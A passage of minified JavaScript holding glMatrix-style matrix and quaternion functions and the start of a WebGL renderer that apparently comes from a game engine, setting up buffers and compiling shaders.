            return t[1] = t[3], t[2] = t[6], t[3] = i, t[5] = t[7], t[6] = n, t[7] = r, t
        }
        return e[0] = t[0], e[1] = t[3], e[2] = t[6], e[3] = t[1], e[4] = t[4], e[5] = t[7], e[6] = t[2], e[7] = t[5], e[8] = t[8], e
    }, mat3.toMat4 = function (t, e) {
        return e || (e = mat4.create()), e[15] = 1, e[14] = 0, e[13] = 0, e[12] = 0, e[11] = 0, e[10] = t[8], e[9] = t[7], e[8] = t[6], e[7] = 0, e[6] = t[5], e[5] = t[4], e[4] = t[3], e[3] = 0, e[2] = t[2], e[1] = t[1], e[0] = t[0], e
    }, mat3.str = function (t) {
        return "[" + t[0] + ", " + t[1] + ", " + t[2] + ", " + t[3] + ", " + t[4] + ", " + t[5] + ", " + t[6] + ", " + t[7] + ", " + t[8] + "]"
    }, mat4.create = function (t) {
        var e = new MatrixArray(16);
        return t && (e[0] = t[0], e[1] = t[1], e[2] = t[2], e[3] = t[3], e[4] = t[4], e[5] = t[5], e[6] = t[6], e[7] = t[7], e[8] = t[8], e[9] = t[9], e[10] = t[10], e[11] = t[11], e[12] = t[12], e[13] = t[13], e[14] = t[14], e[15] = t[15]), e
    }, mat4.set = function (t, e) {
        return e[0] = t[0], e[1] = t[1], e[2] = t[2], e[3] = t[3], e[4] = t[4], e[5] = t[5], e[6] = t[6], e[7] = t[7], e[8] = t[8], e[9] = t[9], e[10] = t[10], e[11] = t[11], e[12] = t[12], e[13] = t[13], e[14] = t[14], e[15] = t[15], e
    }, mat4.identity = function (t) {
        return t[0] = 1, t[1] = 0, t[2] = 0, t[3] = 0, t[4] = 0, t[5] = 1, t[6] = 0, t[7] = 0, t[8] = 0, t[9] = 0, t[10] = 1, t[11] = 0, t[12] = 0, t[13] = 0, t[14] = 0, t[15] = 1, t
    }, mat4.transpose = function (t, e) {
        if (!e || t === e) {
            var i = t[1],
                n = t[2],
                r = t[3],
                s = t[6],
                o = t[7],
                a = t[11];
            return t[1] = t[4], t[2] = t[8], t[3] = t[12], t[4] = i, t[6] = t[9], t[7] = t[13], t[8] = n, t[9] = s, t[11] = t[14], t[12] = r, t[13] = o, t[14] = a, t
        }
        return e[0] = t[0], e[1] = t[4], e[2] = t[8], e[3] = t[12], e[4] = t[1], e[5] = t[5], e[6] = t[9], e[7] = t[13], e[8] = t[2], e[9] = t[6], e[10] = t[10], e[11] = t[14], e[12] = t[3], e[13] = t[7], e[14] = t[11], e[15] = t[15], e
    }, mat4.determinant = function (t) {
        var e = t[0],
            i = t[1],
            n = t[2],
            r = t[3],
            s = t[4],
            o = t[5],
            a = t[6],
            h = t[7],
            c = t[8],
            l = t[9],
            u = t[10],
            p = t[11],
            d = t[12],
            f = t[13],
            m = t[14];
        return d * l * a * r - c * f * a * r - d * o * u * r + s * f * u * r + c * o * m * r - s * l * m * r - d * l * n * h + c * f * n * h + d * i * u * h - e * f * u * h - c * i * m * h + e * l * m * h + d * o * n * p - s * f * n * p - d * i * a * p + e * f * a * p + s * i * m * p - e * o * m * p - c * o * n * (t = t[15]) + s * l * n * t + c * i * a * t - e * l * a * t - s * i * u * t + e * o * u * t
    }, mat4.inverse = function (t, e) {
        e || (e = t);
        var i = t[0],
            n = t[1],
            r = t[2],
            s = t[3],
            o = t[4],
            a = t[5],
            h = t[6],
            c = t[7],
            l = t[8],
            u = t[9],
            p = t[10],
            d = t[11],
            f = t[12],
            m = t[13],
            g = t[14],
            y = t[15],
            _ = i * a - n * o,
            v = i * h - r * o,
            b = i * c - s * o,
            w = n * h - r * a,
            x = n * c - s * a,
            S = r * c - s * h,
            T = l * m - u * f,
            C = l * g - p * f,
            A = l * y - d * f,
            O = u * g - p * m,
            k = u * y - d * m,
            P = p * y - d * g,
            I = 1 / (_ * P - v * k + b * O + w * A - x * C + S * T);
        return e[0] = (a * P - h * k + c * O) * I, e[1] = (-n * P + r * k - s * O) * I, e[2] = (m * S - g * x + y * w) * I, e[3] = (-u * S + p * x - d * w) * I, e[4] = (-o * P + h * A - c * C) * I, e[5] = (i * P - r * A + s * C) * I, e[6] = (-f * S + g * b - y * v) * I, e[7] = (l * S - p * b + d * v) * I, e[8] = (o * k - a * A + c * T) * I, e[9] = (-i * k + n * A - s * T) * I, e[10] = (f * x - m * b + y * _) * I, e[11] = (-l * x + u * b - d * _) * I, e[12] = (-o * O + a * C - h * T) * I, e[13] = (i * O - n * C + r * T) * I, e[14] = (-f * w + m * v - g * _) * I, e[15] = (l * w - u * v + p * _) * I, e
    }, mat4.toRotationMat = function (t, e) {
        return e || (e = mat4.create()), e[0] = t[0], e[1] = t[1], e[2] = t[2], e[3] = t[3], e[4] = t[4], e[5] = t[5], e[6] = t[6], e[7] = t[7], e[8] = t[8], e[9] = t[9], e[10] = t[10], e[11] = t[11], e[12] = 0, e[13] = 0, e[14] = 0, e[15] = 1, e
    }, mat4.toMat3 = function (t, e) {
        return e || (e = mat3.create()), e[0] = t[0], e[1] = t[1], e[2] = t[2], e[3] = t[4], e[4] = t[5], e[5] = t[6], e[6] = t[8], e[7] = t[9], e[8] = t[10], e
    }, mat4.toInverseMat3 = function (t, e) {
        var i = t[0],
            n = t[1],
            r = t[2],
            s = t[4],
            o = t[5],
            a = t[6],
            h = t[8],
            c = t[9],
            l = t[10],
            u = l * o - a * c,
            p = -l * s + a * h,
            d = c * s - o * h,
            f = i * u + n * p + r * d;
        return f ? (f = 1 / f, e || (e = mat3.create()), e[0] = u * f, e[1] = (-l * n + r * c) * f, e[2] = (a * n - r * o) * f, e[3] = p * f, e[4] = (l * i - r * h) * f, e[5] = (-a * i + r * s) * f, e[6] = d * f, e[7] = (-c * i + n * h) * f, e[8] = (o * i - n * s) * f, e) : null
    }, mat4.multiply = function (t, e, i) {
        i || (i = t);
        var n = t[0],
            r = t[1],
            s = t[2],
            o = t[3],
            a = t[4],
            h = t[5],
            c = t[6],
            l = t[7],
            u = t[8],
            p = t[9],
            d = t[10],
            f = t[11],
            m = t[12],
            g = t[13],
            y = t[14],
            _ = (t = t[15], e[0]),
            v = e[1],
            b = e[2],
            w = e[3],
            x = e[4],
            S = e[5],
            T = e[6],
            C = e[7],
            A = e[8],
            O = e[9],
            k = e[10],
            P = e[11],
            I = e[12],
            E = e[13],
            R = e[14];
        e = e[15];
        return i[0] = _ * n + v * a + b * u + w * m, i[1] = _ * r + v * h + b * p + w * g, i[2] = _ * s + v * c + b * d + w * y, i[3] = _ * o + v * l + b * f + w * t, i[4] = x * n + S * a + T * u + C * m, i[5] = x * r + S * h + T * p + C * g, i[6] = x * s + S * c + T * d + C * y, i[7] = x * o + S * l + T * f + C * t, i[8] = A * n + O * a + k * u + P * m, i[9] = A * r + O * h + k * p + P * g, i[10] = A * s + O * c + k * d + P * y, i[11] = A * o + O * l + k * f + P * t, i[12] = I * n + E * a + R * u + e * m, i[13] = I * r + E * h + R * p + e * g, i[14] = I * s + E * c + R * d + e * y, i[15] = I * o + E * l + R * f + e * t, i
    }, mat4.multiplyVec3 = function (t, e, i) {
        i || (i = e);
        var n = e[0],
            r = e[1];
        e = e[2];
        return i[0] = t[0] * n + t[4] * r + t[8] * e + t[12], i[1] = t[1] * n + t[5] * r + t[9] * e + t[13], i[2] = t[2] * n + t[6] * r + t[10] * e + t[14], i
    }, mat4.multiplyVec4 = function (t, e, i) {
        i || (i = e);
        var n = e[0],
            r = e[1],
            s = e[2];
        e = e[3];
        return i[0] = t[0] * n + t[4] * r + t[8] * s + t[12] * e, i[1] = t[1] * n + t[5] * r + t[9] * s + t[13] * e, i[2] = t[2] * n + t[6] * r + t[10] * s + t[14] * e, i[3] = t[3] * n + t[7] * r + t[11] * s + t[15] * e, i
    }, mat4.translate = function (t, e, i) {
        var n, r, s, o, a, h, c, l, u, p, d, f, m = e[0],
            g = e[1];
        e = e[2];
        return i && t !== i ? (n = t[0], r = t[1], s = t[2], o = t[3], a = t[4], h = t[5], c = t[6], l = t[7], u = t[8], p = t[9], d = t[10], f = t[11], i[0] = n, i[1] = r, i[2] = s, i[3] = o, i[4] = a, i[5] = h, i[6] = c, i[7] = l, i[8] = u, i[9] = p, i[10] = d, i[11] = f, i[12] = n * m + a * g + u * e + t[12], i[13] = r * m + h * g + p * e + t[13], i[14] = s * m + c * g + d * e + t[14], i[15] = o * m + l * g + f * e + t[15], i) : (t[12] = t[0] * m + t[4] * g + t[8] * e + t[12], t[13] = t[1] * m + t[5] * g + t[9] * e + t[13], t[14] = t[2] * m + t[6] * g + t[10] * e + t[14], t[15] = t[3] * m + t[7] * g + t[11] * e + t[15], t)
    }, mat4.scale = function (t, e, i) {
        var n = e[0],
            r = e[1];
        e = e[2];
        return i && t !== i ? (i[0] = t[0] * n, i[1] = t[1] * n, i[2] = t[2] * n, i[3] = t[3] * n, i[4] = t[4] * r, i[5] = t[5] * r, i[6] = t[6] * r, i[7] = t[7] * r, i[8] = t[8] * e, i[9] = t[9] * e, i[10] = t[10] * e, i[11] = t[11] * e, i[12] = t[12], i[13] = t[13], i[14] = t[14], i[15] = t[15], i) : (t[0] *= n, t[1] *= n, t[2] *= n, t[3] *= n, t[4] *= r, t[5] *= r, t[6] *= r, t[7] *= r, t[8] *= e, t[9] *= e, t[10] *= e, t[11] *= e, t)
    }, mat4.rotate = function (t, e, i, n) {
        var r, s, o, a, h, c, l, u, p, d, f, m, g, y, _, v, b, w, x, S, T = i[0],
            C = i[1],
            A = (i = i[2], Math.sqrt(T * T + C * C + i * i));
        return A ? (1 !== A && (T *= A = 1 / A, C *= A, i *= A), r = Math.sin(e), o = 1 - (s = Math.cos(e)), e = t[0], A = t[1], a = t[2], h = t[3], c = t[4], l = t[5], u = t[6], p = t[7], d = t[8], f = t[9], m = t[10], g = t[11], y = T * T * o + s, _ = C * T * o + i * r, v = i * T * o - C * r, b = T * C * o - i * r, w = C * C * o + s, x = i * C * o + T * r, S = T * i * o + C * r, T = C * i * o - T * r, C = i * i * o + s, n ? t !== n && (n[12] = t[12], n[13] = t[13], n[14] = t[14], n[15] = t[15]) : n = t, n[0] = e * y + c * _ + d * v, n[1] = A * y + l * _ + f * v, n[2] = a * y + u * _ + m * v, n[3] = h * y + p * _ + g * v, n[4] = e * b + c * w + d * x, n[5] = A * b + l * w + f * x, n[6] = a * b + u * w + m * x, n[7] = h * b + p * w + g * x, n[8] = e * S + c * T + d * C, n[9] = A * S + l * T + f * C, n[10] = a * S + u * T + m * C, n[11] = h * S + p * T + g * C, n) : null
    }, mat4.rotateX = function (t, e, i) {
        var n = Math.sin(e),
            r = (e = Math.cos(e), t[4]),
            s = t[5],
            o = t[6],
            a = t[7],
            h = t[8],
            c = t[9],
            l = t[10],
            u = t[11];
        return i ? t !== i && (i[0] = t[0], i[1] = t[1], i[2] = t[2], i[3] = t[3], i[12] = t[12], i[13] = t[13], i[14] = t[14], i[15] = t[15]) : i = t, i[4] = r * e + h * n, i[5] = s * e + c * n, i[6] = o * e + l * n, i[7] = a * e + u * n, i[8] = r * -n + h * e, i[9] = s * -n + c * e, i[10] = o * -n + l * e, i[11] = a * -n + u * e, i
    }, mat4.rotateY = function (t, e, i) {
        var n = Math.sin(e),
            r = (e = Math.cos(e), t[0]),
            s = t[1],
            o = t[2],
            a = t[3],
            h = t[8],
            c = t[9],
            l = t[10],
            u = t[11];
        return i ? t !== i && (i[4] = t[4], i[5] = t[5], i[6] = t[6], i[7] = t[7], i[12] = t[12], i[13] = t[13], i[14] = t[14], i[15] = t[15]) : i = t, i[0] = r * e + h * -n, i[1] = s * e + c * -n, i[2] = o * e + l * -n, i[3] = a * e + u * -n, i[8] = r * n + h * e, i[9] = s * n + c * e, i[10] = o * n + l * e, i[11] = a * n + u * e, i
    }, mat4.rotateZ = function (t, e, i) {
        var n = Math.sin(e),
            r = (e = Math.cos(e), t[0]),
            s = t[1],
            o = t[2],
            a = t[3],
            h = t[4],
            c = t[5],
            l = t[6],
            u = t[7];
        return i ? t !== i && (i[8] = t[8], i[9] = t[9], i[10] = t[10], i[11] = t[11], i[12] = t[12], i[13] = t[13], i[14] = t[14], i[15] = t[15]) : i = t, i[0] = r * e + h * n, i[1] = s * e + c * n, i[2] = o * e + l * n, i[3] = a * e + u * n, i[4] = r * -n + h * e, i[5] = s * -n + c * e, i[6] = o * -n + l * e, i[7] = a * -n + u * e, i
    }, mat4.frustum = function (t, e, i, n, r, s, o) {
        o || (o = mat4.create());
        var a = e - t,
            h = n - i,
            c = s - r;
        return o[0] = 2 * r / a, o[1] = 0, o[2] = 0, o[3] = 0, o[4] = 0, o[5] = 2 * r / h, o[6] = 0, o[7] = 0, o[8] = (e + t) / a, o[9] = (n + i) / h, o[10] = -(s + r) / c, o[11] = -1, o[12] = 0, o[13] = 0, o[14] = -s * r * 2 / c, o[15] = 0, o
    }, mat4.perspective = function (t, e, i, n, r) {
        return e *= t = i * Math.tan(t * Math.PI / 360), mat4.frustum(-e, e, -t, t, i, n, r)
    }, mat4.ortho = function (t, e, i, n, r, s, o) {
        o || (o = mat4.create());
        var a = e - t,
            h = n - i,
            c = s - r;
        return o[0] = 2 / a, o[1] = 0, o[2] = 0, o[3] = 0, o[4] = 0, o[5] = 2 / h, o[6] = 0, o[7] = 0, o[8] = 0, o[9] = 0, o[10] = -2 / c, o[11] = 0, o[12] = -(t + e) / a, o[13] = -(n + i) / h, o[14] = -(s + r) / c, o[15] = 1, o
    }, mat4.lookAt = function (t, e, i, n) {
        n || (n = mat4.create());
        var r, s, o, a, h, c, l, u, p = t[0],
            d = t[1];
        t = t[2];
        return s = i[0], o = i[1], r = i[2], i = e[1], c = e[2], p === e[0] && d === i && t === c ? mat4.identity(n) : (i = p - e[0], c = d - e[1], l = t - e[2], e = o * (l *= u = 1 / Math.sqrt(i * i + c * c + l * l)) - r * (c *= u), r = r * (i *= u) - s * l, s = s * c - o * i, (u = Math.sqrt(e * e + r * r + s * s)) ? (e *= u = 1 / u, r *= u, s *= u) : s = r = e = 0, o = c * s - l * r, a = l * e - i * s, h = i * r - c * e, (u = Math.sqrt(o * o + a * a + h * h)) ? (o *= u = 1 / u, a *= u, h *= u) : h = a = o = 0, n[0] = e, n[1] = o, n[2] = i, n[3] = 0, n[4] = r, n[5] = a, n[6] = c, n[7] = 0, n[8] = s, n[9] = h, n[10] = l, n[11] = 0, n[12] = -(e * p + r * d + s * t), n[13] = -(o * p + a * d + h * t), n[14] = -(i * p + c * d + l * t), n[15] = 1, n)
    }, mat4.fromRotationTranslation = function (t, e, i) {
        i || (i = mat4.create());
        var n = t[0],
            r = t[1],
            s = t[2],
            o = t[3],
            a = n + n,
            h = r + r,
            c = s + s,
            l = (t = n * a, n * h);
        n *= c;
        var u = r * h;
        return r *= c, s *= c, a *= o, h *= o, o *= c, i[0] = 1 - (u + s), i[1] = l + o, i[2] = n - h, i[3] = 0, i[4] = l - o, i[5] = 1 - (t + s), i[6] = r + a, i[7] = 0, i[8] = n + h, i[9] = r - a, i[10] = 1 - (t + u), i[11] = 0, i[12] = e[0], i[13] = e[1], i[14] = e[2], i[15] = 1, i
    }, mat4.str = function (t) {
        return "[" + t[0] + ", " + t[1] + ", " + t[2] + ", " + t[3] + ", " + t[4] + ", " + t[5] + ", " + t[6] + ", " + t[7] + ", " + t[8] + ", " + t[9] + ", " + t[10] + ", " + t[11] + ", " + t[12] + ", " + t[13] + ", " + t[14] + ", " + t[15] + "]"
    }, quat4.create = function (t) {
        var e = new MatrixArray(4);
        return t && (e[0] = t[0], e[1] = t[1], e[2] = t[2], e[3] = t[3]), e
    }, quat4.set = function (t, e) {
        return e[0] = t[0], e[1] = t[1], e[2] = t[2], e[3] = t[3], e
    }, quat4.calculateW = function (t, e) {
        var i = t[0],
            n = t[1],
            r = t[2];
        return e && t !== e ? (e[0] = i, e[1] = n, e[2] = r, e[3] = -Math.sqrt(Math.abs(1 - i * i - n * n - r * r)), e) : (t[3] = -Math.sqrt(Math.abs(1 - i * i - n * n - r * r)), t)
    }, quat4.inverse = function (t, e) {
        return e && t !== e ? (e[0] = -t[0], e[1] = -t[1], e[2] = -t[2], e[3] = t[3], e) : (t[0] *= -1, t[1] *= -1, t[2] *= -1, t)
    }, quat4.length = function (t) {
        var e = t[0],
            i = t[1],
            n = t[2];
        t = t[3];
        return Math.sqrt(e * e + i * i + n * n + t * t)
    }, quat4.normalize = function (t, e) {
        e || (e = t);
        var i = t[0],
            n = t[1],
            r = t[2],
            s = t[3],
            o = Math.sqrt(i * i + n * n + r * r + s * s);
        return 0 === o ? (e[0] = 0, e[1] = 0, e[2] = 0, e[3] = 0, e) : (o = 1 / o, e[0] = i * o, e[1] = n * o, e[2] = r * o, e[3] = s * o, e)
    }, quat4.multiply = function (t, e, i) {
        i || (i = t);
        var n = t[0],
            r = t[1],
            s = t[2],
            o = (t = t[3], e[0]),
            a = e[1],
            h = e[2];
        e = e[3];
        return i[0] = n * e + t * o + r * h - s * a, i[1] = r * e + t * a + s * o - n * h, i[2] = s * e + t * h + n * a - r * o, i[3] = t * e - n * o - r * a - s * h, i
    }, quat4.multiplyVec3 = function (t, e, i) {
        i || (i = e);
        var n = e[0],
            r = e[1],
            s = e[2],
            o = (e = t[0], t[1]),
            a = t[2],
            h = (t = t[3]) * n + o * s - a * r,
            c = t * r + a * n - e * s,
            l = t * s + e * r - o * n;
        n = -e * n - o * r - a * s;
        return i[0] = h * t + n * -e + c * -a - l * -o, i[1] = c * t + n * -o + l * -e - h * -a, i[2] = l * t + n * -a + h * -o - c * -e, i
    }, quat4.toMat3 = function (t, e) {
        e || (e = mat3.create());
        var i = t[0],
            n = t[1],
            r = t[2],
            s = t[3],
            o = i + i,
            a = n + n,
            h = r + r,
            c = i * o,
            l = i * a;
        i *= h;
        var u = n * a;
        return n *= h, r *= h, o *= s, a *= s, s *= h, e[0] = 1 - (u + r), e[1] = l + s, e[2] = i - a, e[3] = l - s, e[4] = 1 - (c + r), e[5] = n + o, e[6] = i + a, e[7] = n - o, e[8] = 1 - (c + u), e
    }, quat4.toMat4 = function (t, e) {
        e || (e = mat4.create());
        var i = t[0],
            n = t[1],
            r = t[2],
            s = t[3],
            o = i + i,
            a = n + n,
            h = r + r,
            c = i * o,
            l = i * a;
        i *= h;
        var u = n * a;
        return n *= h, r *= h, o *= s, a *= s, s *= h, e[0] = 1 - (u + r), e[1] = l + s, e[2] = i - a, e[3] = 0, e[4] = l - s, e[5] = 1 - (c + r), e[6] = n + o, e[7] = 0, e[8] = i + a, e[9] = n - o, e[10] = 1 - (c + u), e[11] = 0, e[12] = 0, e[13] = 0, e[14] = 0, e[15] = 1, e
    }, quat4.slerp = function (t, e, i, n) {
        n || (n = t);
        var r, s, o = t[0] * e[0] + t[1] * e[1] + t[2] * e[2] + t[3] * e[3];
        return Math.abs(o) >= 1 ? (n !== t && (n[0] = t[0], n[1] = t[1], n[2] = t[2], n[3] = t[3]), n) : (r = Math.acos(o), s = Math.sqrt(1 - o * o), Math.abs(s) < .001 ? (n[0] = .5 * t[0] + .5 * e[0], n[1] = .5 * t[1] + .5 * e[1], n[2] = .5 * t[2] + .5 * e[2], n[3] = .5 * t[3] + .5 * e[3], n) : (o = Math.sin((1 - i) * r) / s, i = Math.sin(i * r) / s, n[0] = t[0] * o + e[0] * i, n[1] = t[1] * o + e[1] * i, n[2] = t[2] * o + e[2] * i, n[3] = t[3] * o + e[3] * i, n))
    }, quat4.str = function (t) {
        return "[" + t[0] + ", " + t[1] + ", " + t[2] + ", " + t[3] + "]"
    },
    function () {
        var t = 8e3,
            e = mat4.create();

        function i(t, e, i) {
            this.isIE = /msie/i.test(navigator.userAgent) || /trident/i.test(navigator.userAgent), this.width = 0, this.height = 0, this.enableFrontToBack = !!i, this.isEarlyZPass = !1, this.isBatchInEarlyZPass = !1, this.currentZ = 0, this.zNear = 1, this.zFar = 1e3, this.zIncrement = (this.zFar - this.zNear) / 32768, this.zA = this.zFar / (this.zFar - this.zNear), this.zB = this.zFar * this.zNear / (this.zNear - this.zFar), this.kzA = 65536 * this.zA, this.kzB = 65536 * this.zB, this.cam = vec3.create([0, 0, 100]), this.look = vec3.create([0, 0, 0]), this.up = vec3.create([0, 1, 0]), this.worldScale = vec3.create([1, 1, 1]), this.enable_mipmaps = !0, this.matP = mat4.create(), this.matMV = mat4.create(), this.lastMV = mat4.create(), this.currentMV = mat4.create(), this.gl = t, this.version = 0 === this.gl.getParameter(this.gl.VERSION).indexOf("WebGL 2") ? 2 : 1, this.initState()
        }

        function n(t, e, i) {
            this.gl = t, this.shaderProgram = e, this.name = i, this.locAPos = t.getAttribLocation(e, "aPos"), this.locATex = t.getAttribLocation(e, "aTex"), this.locMatP = t.getUniformLocation(e, "matP"), this.locMatMV = t.getUniformLocation(e, "matMV"), this.locOpacity = t.getUniformLocation(e, "opacity"), this.locColorFill = t.getUniformLocation(e, "colorFill"), this.locSamplerFront = t.getUniformLocation(e, "samplerFront"), this.locSamplerBack = t.getUniformLocation(e, "samplerBack"), this.locDestStart = t.getUniformLocation(e, "destStart"), this.locDestEnd = t.getUniformLocation(e, "destEnd"), this.locSeconds = t.getUniformLocation(e, "seconds"), this.locPixelWidth = t.getUniformLocation(e, "pixelWidth"), this.locPixelHeight = t.getUniformLocation(e, "pixelHeight"), this.locLayerScale = t.getUniformLocation(e, "layerScale"), this.locLayerAngle = t.getUniformLocation(e, "layerAngle"), this.locViewOrigin = t.getUniformLocation(e, "viewOrigin"), this.locScrollPos = t.getUniformLocation(e, "scrollPos"), this.hasAnyOptionalUniforms = !!(this.locPixelWidth || this.locPixelHeight || this.locSeconds || this.locSamplerBack || this.locDestStart || this.locDestEnd || this.locLayerScale || this.locLayerAngle || this.locViewOrigin || this.locScrollPos), this.lpPixelWidth = -999, this.lpPixelHeight = -999, this.lpOpacity = 1, this.lpDestStartX = 0, this.lpDestStartY = 0, this.lpDestEndX = 1, this.lpDestEndY = 1, this.lpLayerScale = 1, this.lpLayerAngle = 0, this.lpViewOriginX = 0, this.lpViewOriginY = 0, this.lpScrollPosX = 0, this.lpScrollPosY = 0, this.lpSeconds = 0, this.lastCustomParams = [], this.lpMatMV = mat4.create(), this.locOpacity && t.uniform1f(this.locOpacity, 1), this.locColorFill && t.uniform4f(this.locColorFill, 1, 1, 1, 1), this.locSamplerFront && t.uniform1i(this.locSamplerFront, 0), this.locSamplerBack && t.uniform1i(this.locSamplerBack, 1), this.locDestStart && t.uniform2f(this.locDestStart, 0, 0), this.locDestEnd && t.uniform2f(this.locDestEnd, 1, 1), this.locLayerScale && t.uniform1f(this.locLayerScale, 1), this.locLayerAngle && t.uniform1f(this.locLayerAngle, 0), this.locViewOrigin && t.uniform2f(this.locViewOrigin, 0, 0), this.locScrollPos && t.uniform2f(this.locScrollPos, 0, 0), this.locSeconds && t.uniform1f(this.locSeconds, 0), this.hasCurrentMatMV = !1
        }

        function r(t, e) {
            return t[0] === e[0] && t[1] === e[1] && t[2] === e[2] && t[3] === e[3] && t[4] === e[4] && t[5] === e[5] && t[6] === e[6] && t[7] === e[7] && t[8] === e[8] && t[9] === e[9] && t[10] === e[10] && t[11] === e[11] && t[12] === e[12] && t[13] === e[13] && t[14] === e[14] && t[15] === e[15]
        }

        function s(t, e) {
            this.type = t, this.glwrap = e, this.gl = e.gl, this.opacityParam = 0, this.startIndex = 0, this.indexCount = 0, this.texParam = null, this.mat4param = null, this.shaderParams = [], cr.seal(this)
        }
        i.prototype.initState = function () {
            var e, i = this.gl;
            for (this.lastOpacity = 1, this.lastTexture0 = null, this.lastTexture1 = null, this.currentOpacity = 1, i.clearColor(0, 0, 0, 0), i.clear(i.COLOR_BUFFER_BIT), i.enable(i.BLEND), i.blendFunc(i.ONE, i.ONE_MINUS_SRC_ALPHA), i.disable(i.CULL_FACE), i.disable(i.STENCIL_TEST), i.disable(i.DITHER), this.enableFrontToBack ? (i.enable(i.DEPTH_TEST), i.depthFunc(i.LEQUAL)) : i.disable(i.DEPTH_TEST), this.maxTextureSize = i.getParameter(i.MAX_TEXTURE_SIZE), this.lastSrcBlend = i.ONE, this.lastDestBlend = i.ONE_MINUS_SRC_ALPHA, this.vertexData = new Float32Array(t * (this.enableFrontToBack ? 3 : 2)), this.texcoordData = new Float32Array(16e3), this.pointData = new Float32Array(32e3), this.pointBuffer = i.createBuffer(), i.bindBuffer(i.ARRAY_BUFFER, this.pointBuffer), i.bufferData(i.ARRAY_BUFFER, this.pointData.byteLength, i.DYNAMIC_DRAW), this.vertexBuffers = new Array(4), this.texcoordBuffers = new Array(4), e = 0; e < 4; e++) this.vertexBuffers[e] = i.createBuffer(), i.bindBuffer(i.ARRAY_BUFFER, this.vertexBuffers[e]), i.bufferData(i.ARRAY_BUFFER, this.vertexData.byteLength, i.DYNAMIC_DRAW), this.texcoordBuffers[e] = i.createBuffer(), i.bindBuffer(i.ARRAY_BUFFER, this.texcoordBuffers[e]), i.bufferData(i.ARRAY_BUFFER, this.texcoordData.byteLength, i.DYNAMIC_DRAW);
            this.curBuffer = 0, this.indexBuffer = i.createBuffer(), i.bindBuffer(i.ELEMENT_ARRAY_BUFFER, this.indexBuffer);
            var n = new Uint16Array(12e3);
            e = 0;
            for (var r, s, o = 0; e < 12e3;) n[e++] = o, n[e++] = o + 1, n[e++] = o + 2, n[e++] = o, n[e++] = o + 2, n[e++] = o + 3, o += 4;
            i.bufferData(i.ELEMENT_ARRAY_BUFFER, n, i.STATIC_DRAW), this.vertexPtr = 0, this.texPtr = 0, this.pointPtr = 0, this.shaderPrograms = [], r = ["varying mediump vec2 vTex;", "uniform lowp float opacity;", "uniform lowp sampler2D samplerFront;", "void main(void) {", "\tgl_FragColor = texture2D(samplerFront, vTex);", "\tgl_FragColor *= opacity;", "}"].join("\n"), s = this.enableFrontToBack ? ["attribute highp vec3 aPos;", "attribute mediump vec2 aTex;", "varying mediump vec2 vTex;", "uniform highp mat4 matP;", "uniform highp mat4 matMV;", "void main(void) {", "\tgl_Position = matP * matMV * vec4(aPos.x, aPos.y, aPos.z, 1.0);", "\tvTex = aTex;", "}"].join("\n") : ["attribute highp vec2 aPos;", "attribute mediump vec2 aTex;", "varying mediump vec2 vTex;", "uniform highp mat4 matP;", "uniform highp mat4 matMV;", "void main(void) {", "\tgl_Position = matP * matMV * vec4(aPos.x, aPos.y, 0.0, 1.0);", "\tvTex = aTex;", "}"].join("\n");
            var a = this.createShaderProgram({
                src: r
            }, s, "<default>");
            this.shaderPrograms.push(a), r = ["uniform mediump sampler2D samplerFront;", "varying lowp float opacity;", "void main(void) {", "\tgl_FragColor = texture2D(samplerFront, gl_PointCoord);", "\tgl_FragColor *= opacity;", "}"].join("\n");
            var h = ["attribute vec4 aPos;", "varying float opacity;", "uniform mat4 matP;", "uniform mat4 matMV;", "void main(void) {", "\tgl_Position = matP * matMV * vec4(aPos.x, aPos.y, 0.0, 1.0);", "\tgl_PointSize = aPos.z;", "\topacity = aPos.w;", "}"].join("\n");
            a = this.createShaderProgram({
                src: r
            }, h, "<point>"), this.shaderPrograms.push(a), r = ["varying mediump vec2 vTex;", "uniform lowp sampler2D samplerFront;", "void main(void) {", "\tif (texture2D(samplerFront, vTex).a < 1.0)", "\t\tdiscard;", "}"].join("\n");
            a = this.createShaderProgram({
                src: r
            }, s, "<earlyz>");
            this.shaderPrograms.push(a), r = ["uniform lowp vec4 colorFill;", "void main(void) {", "\tgl_FragColor = colorFill;", "}"].join("\n");
            a = this.createShaderProgram({
                src: r
            }, s, "<fill>");
            for (var c in this.shaderPrograms.push(a), cr.shaders) cr.shaders.hasOwnProperty(c) && this.shaderPrograms.push(this.createShaderProgram(cr.shaders[c], s, c));
            i.activeTexture(i.TEXTURE0), i.bindTexture(i.TEXTURE_2D, null), this.batch = [], this.batchPtr = 0, this.hasQuadBatchTop = !1, this.hasPointBatchTop = !1, this.lastProgram = -1, this.currentProgram = -1, this.currentShader = null, this.fbo = i.createFramebuffer(), this.renderToTex = null, this.depthBuffer = null, this.attachedDepthBuffer = !1, this.enableFrontToBack && (this.depthBuffer = i.createRenderbuffer()), this.tmpVec3 = vec3.create([0, 0, 0]);
            var l = i.getParameter(i.ALIASED_POINT_SIZE_RANGE);
            this.minPointSize = l[0], this.maxPointSize = l[1], this.maxPointSize > 2048 && (this.maxPointSize = 2048), this.switchProgram(0), cr.seal(this)
        }, n.prototype.updateMatMV = function (t) {
            r(this.lpMatMV, t) || (mat4.set(t, this.lpMatMV), this.gl.uniformMatrix4fv(this.locMatMV, !1, t))
        }, i.prototype.createShaderProgram = function (t, e, i) {
            var r = this.gl,
                s = r.createShader(r.FRAGMENT_SHADER);
            if (r.shaderSource(s, t.src), r.compileShader(s), !r.getShaderParameter(s, r.COMPILE_STATUS)) {
                var o = r.getShaderInfoLog(s);
                throw r.deleteShader(s), new Error("error compiling fragment shader: " + o)
            }
            var a = r.createShader(r.VERTEX_SHADER);
            if (r.shaderSource(a, e), r.compileShader(a), !r.getShaderParameter(a, r.COMPILE_STATUS)) {
                o = r.getShaderInfoLog(a);
                throw r.deleteShader(s), r.deleteShader(a), new Error("error compiling vertex shader: " + o)
            }
            var h = r.createProgram();
            if (r.attachShader(h, s), r.attachShader(h, a), r.linkProgram(h), !r.getProgramParameter(h, r.LINK_STATUS)) {
                o = r.getProgramInfoLog(h);
                throw r.deleteShader(s), r.deleteShader(a), r.deleteProgram(h), new Error("error linking shader program: " + o)
            }
            r.useProgram(h), r.deleteShader(s), r.deleteShader(a);
            var c, l, u = new n(r, h, i);
